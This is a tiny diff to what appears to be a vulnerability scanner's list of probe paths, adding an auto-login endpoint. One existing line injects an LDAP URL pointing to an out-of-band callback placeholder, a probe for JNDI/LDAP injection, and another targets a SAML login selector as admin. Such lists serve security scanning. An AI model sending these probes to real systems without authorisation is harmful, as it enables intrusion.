@@ -1,2 +1,3 @@
 /albatross/saml/idpSelection?id={{randstr}}&userName=admin
 /decisioncenter-api/v1/about?datasource=ldap://{{interactsh-url}}
+/api/v1/auto_login
